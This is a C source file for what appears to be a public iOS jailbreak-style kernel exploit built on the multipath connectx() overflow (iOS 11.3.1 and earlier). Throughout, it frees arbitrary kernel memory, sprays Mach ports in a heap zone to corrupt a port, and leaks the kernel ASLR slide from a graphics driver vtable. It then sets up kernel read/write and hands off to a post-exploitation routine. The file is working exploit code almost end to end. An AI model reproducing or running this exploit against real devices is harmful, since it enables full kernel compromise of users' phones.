//
//  multipath_kfree.h
//  multipath_kfree
//
//  Created by John Åkerblom on 6/1/18.
//

#include "multipath_kfree.h"
#include "offsets.h"
#include "extra_recipe_utils.h"
#include "multipath_kfree.h"
#include "reboot.h"
#include "postexploit.h"
#include <netinet/in.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <sys/socket.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


uint64_t kernel_base = 0;

static void _init_port_with_empty_msg(mach_port_t port)
{
    uint8_t buf[256];
    memset(buf, 0x00, sizeof(buf));
    prepare_prealloc_port(port);
    send_prealloc_msg(port, (uint64_t *)buf, 30);
}

static int _is_port_corrupt(mach_port_t port)
{
    
    kern_return_t err;
    mach_port_seqno_t msg_seqno = 0;
    mach_msg_size_t msg_size = 0;
    mach_msg_id_t msg_id = 0;
    mach_msg_trailer_t msg_trailer; // NULL trailer
    mach_msg_type_number_t msg_trailer_size =  sizeof(msg_trailer);
    err = mach_port_peek(mach_task_self(),
                         port,
                         MACH_RCV_TRAILER_NULL,
                         &msg_seqno,
                         &msg_size,
                         &msg_id,
                         (mach_msg_trailer_info_t)&msg_trailer,
                         &msg_trailer_size);
    if(err == KERN_FAILURE) {
        printf("Failed to peek.\n");
    }
    if (msg_id && (msg_id != 0x962)) {
        printf("Port %#x is corrupt!\n", port);
        return 1;
    }
    
    return 0;
}
#define MULTIPATH_ERRNO_CHECK // Enable rudimentary error checking. Not thread-safe.

#pragma pack(push, 1)
struct not_todescos_not_essers_ipc_object
{
    uint8_t zeroes[132-88];     // Unused by us
    uint32_t mpte_itfinfo_size; // If > 4, ->mpte_itfinfo free'd
    uint8_t nonzeroes[168-136]; // Unused by us
    uint8_t nonzeroes2[16];     // Unused by us
    uint64_t mpte_itfinfo;      // Address to free
};
#pragma pack(pop)

static void _multipath_connectx_overflow(int sock, void *buf, size_t n)
{
    struct sockaddr_in *sa_dst = calloc(1, 0x4000);
    memset(sa_dst, 0x0, 0x4000);
    memcpy(sa_dst, buf, n); //see what we do here, we overflow with an invalid size
    sa_dst->sin_family = AF_UNSPEC;
    sa_dst->sin_len = n;
    
    struct sockaddr_in sa_src;
    memset(&sa_src, 0, sizeof(sa_src));
    sa_src.sin_family = AF_INET;
    sa_src.sin_len = 255;
    
    sa_endpoints_t sae;
    sae.sae_srcif = 0;
    sae.sae_srcaddr = (struct sockaddr *)&sa_src;
    sae.sae_srcaddrlen = 255;
    sae.sae_dstaddr = (struct sockaddr *)sa_dst;
    sae.sae_dstaddrlen = (socklen_t)n;
    errno = 0;
    
    // Trigger overflow
    connectx(sock, &sae, SAE_ASSOCID_ANY, 0, NULL, 0, NULL, NULL);
    
    // We expect return value -1, errno 22 on success (but they don't guarantee it)
    if (errno == 1) {
        *(int *)("You") = (int)"need to pay Apple $100 (add the multipath entitlement)";
    }
    else if (errno == 47) {
        *(int *)("You") = (int)"need to find another bug (iOS <= 11.3.1 only)";
    }
    
    if(sa_dst) {
        free(sa_dst);
    }
}

static void _multipath_kfree(int sock, uint64_t addr, size_t addr_size)
{
    if(sock<0) {
        printf("This doesn't seem like a correct socket, trying anyway...\n");
    }
    
    struct not_todescos_not_essers_ipc_object s = {0};
    //memset(&s, 0x00, sizeof(s)); //Why the fuck would you use memset if you can initialize
    
    memset(&s.nonzeroes, 0x42, sizeof(s.nonzeroes));
    s.mpte_itfinfo_size = 8; // > 4
    s.mpte_itfinfo = addr; // Address to free
    
    _multipath_connectx_overflow(sock, &s, sizeof(s) - sizeof(s.mpte_itfinfo) + addr_size);
    
    // Close for cleanup by GC
    close(sock);
}

/* multipath_kfree: cause GC to free a kernel address. */
void multipath_kfree(uint64_t addr)
{
    int mp_sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
    _multipath_kfree(mp_sock, addr, sizeof(addr));
}

/* multipath_kfree_nearby_self: cause GC to free a "nearby" kernel address.
 NOTE: closes mp_sock */
void multipath_kfree_nearby_self(int mp_sock, uint16_t addr_lowest_part)
{
    _multipath_kfree(mp_sock, addr_lowest_part, sizeof(addr_lowest_part));
}


void multipath_exploit() {
    printf("Initializing multipath_kfree bug...\n");
    io_connect_t refill_userclients[REFILL_USERCLIENTS_COUNT];
    mach_port_t first_ports[FIRST_PORTS_COUNT];
    mach_port_t refill_ports[REFILL_PORTS_COUNT];
    mach_port_t toolazy_ports[TOOLAZY_PORTS_COUNT];
    mach_port_t corrupt_port = 0;
    uint64_t contained_port_addr = 0;
    uint8_t *recv_buf = NULL;
    uint8_t send_buf[1024];
    
    int mp_socks[MP_SOCK_COUNT];
    int prealloc_size = 0x660; // kalloc.4096
    int found = 0;
    int peeks = 0;
    
    printf("Filling the zone with 10,000 machports...\n");
    for (int i = 0; i < 10000; ++i){
        prealloc_port(prealloc_size);
    }
    
    printf("Filling the zone with another 0x20 machports serving as our first port for corruption...\n");
    for (int i = 0; i < 0x20; ++i) {
        first_ports[i] = prealloc_port(prealloc_size);
        
    }
    
    printf("Creating our first socket...\n");
    mp_socks[0] = socket(AF_MULTIPATH, SOCK_STREAM, 0);
    printf("Our first socket descriptor is: %d\n", mp_socks[0]);
    
    printf("Filling our the zone and our first port array with the remaining %d ports...\n", FIRST_PORTS_COUNT-0x20);
    for (int i = 0x20; i < FIRST_PORTS_COUNT; ++i) {
        first_ports[i] = prealloc_port(prealloc_size);
    }
    
    printf("Creating the rest of our %d sockets...\n", MP_SOCK_COUNT-1);
    for (int i = 1; i < MP_SOCK_COUNT; ++i) {
        mp_socks[i] = socket(AF_MULTIPATH, SOCK_STREAM, 0);
    }
    
    printf("Initializing empty messages for all of our potential first ports...\n");
    for (int i = 0; i < FIRST_PORTS_COUNT; ++i) {
        _init_port_with_empty_msg(first_ports[i]);
    }
    
    printf("Freeing first and second in our socket struct and praying that we are still here...\n");
    multipath_kfree_nearby_self(mp_socks[0], 0x0000 + 0x7a0);
    multipath_kfree_nearby_self(mp_socks[3], 0xe000 + 0x7a0);
    
    printf("Finding corrupt port in that zone so we can leak the kernel ASLR shift later...\n");
    for (peeks = 0; peeks < MAX_PEEKS; ++peeks) {
        for (int i = 0 ; i < FIRST_PORTS_COUNT; ++i) {
            if (_is_port_corrupt(first_ports[i])) {
                corrupt_port = first_ports[i];
                printf("Corrupt port: %08X %d\n", corrupt_port, i);
                found = 1;
                break;
            }
        }
        if(peeks == (MAX_PEEKS / 4) && peeks < (MAX_PEEKS /2)) {
            printf("25%% of the ports checked...\n");
        }
        
        if(peeks == (MAX_PEEKS / 2)) {
            printf("50%% of the ports checked, are you sure we are gonna make it? ...\n");
        }
        
        if (found)
            break;
    }
    
    if (peeks >= MAX_PEEKS) {
        printf("Did not find corrupt port\n");
        sleep(1);
        //panic_now(); //Uncomment if you want to reboot upon failure
        exit(0);
    }
    
    printf("Filling ports to serve as a zone spray for finding the kASLR slide and getting r/w...\n");
    for (int i = 0; i < REFILL_PORTS_COUNT; ++i) {
        refill_ports[i] = prealloc_port(prealloc_size);
    }
    
    printf("Initializing empty messages for all of our sprayed ports...\n");
    for (int i = 0; i < REFILL_PORTS_COUNT; ++i) {
        _init_port_with_empty_msg(refill_ports[i]);
    }
    
    printf("Receiving the response message from our corrupt port, leaking the address of our new contained port...\n");
    recv_buf = (uint8_t *)receive_prealloc_msg(corrupt_port);
    
    contained_port_addr = *(uint64_t *)(recv_buf + 0x1C);
    printf("Refill port is at %p\n", (void *)contained_port_addr);
    
    printf("Sending an empty message to our corrupted port...\n");
    memset(send_buf, 0, sizeof(send_buf));
    send_prealloc_msg(corrupt_port, (uint64_t *)send_buf, 30);
    
    printf("Freeing the contained port using multipath bug...\n");
    multipath_kfree(contained_port_addr);
    
    for (;;) {
        if (_is_port_corrupt(corrupt_port)) {
            break;
        }
    }
    printf("Leaking kASLR by filling the zone with userclients to AGXCommandQueue...\n");
    for (int i = 0; i < REFILL_USERCLIENTS_COUNT; ++i) {
        refill_userclients[i] = alloc_userclient();
    }
    
    printf("Receiving back from our corrupt port, leaking the address of the userclient...\n");
    recv_buf = (uint8_t *)receive_prealloc_msg(corrupt_port);
    
    printf("Calculating the address of the vtable of AGXCommandQueue from the leaked userclient...\n");
    uint64_t vtable = *(uint64_t *)(recv_buf + 0x14);
    printf("AGXCommandQueue vtable is at: %p\n", (void *)vtable);
    printf("Calculating kaslr_shift, if this displays 0xffff(something) then check if the vtable offset is correct!\n");
    uint64_t kaslr_shift = vtable - offsets.AGXCommandQueue_vtable ;
    printf("kaslr shift: %p\n", (void*)kaslr_shift);
    
    printf("Destroying the corrupted port as we now have the kASLR slide...\n");
    mach_port_destroy(mach_task_self(), corrupt_port);
    
    printf("Filling the zone again with some random ports so we can get kernel read write...\n");
    for (int i = 0; i < TOOLAZY_PORTS_COUNT; ++i) {
        toolazy_ports[i] = prealloc_port(prealloc_size-0x28); // Not even really aligned because lazy
    }
    
    printf("Setting up kernel r/w access using s1guza's gadgets...\n");
    kx_setup(refill_userclients, toolazy_ports, kaslr_shift, contained_port_addr);
    
    kernel_base = 0xfffffff007004000 + kaslr_shift;
    uint32_t val = kread32(kernel_base);
    printf("Kernel base is at: %#llx and has magic: %#x.\n", kernel_base, val);
    
    printf("Doing post-exploitation stuff, big thanks to Jonathan Levin...\n");
    post_exploitation(kernel_base, kaslr_shift, 1);
    
    printf("Done\n");
}
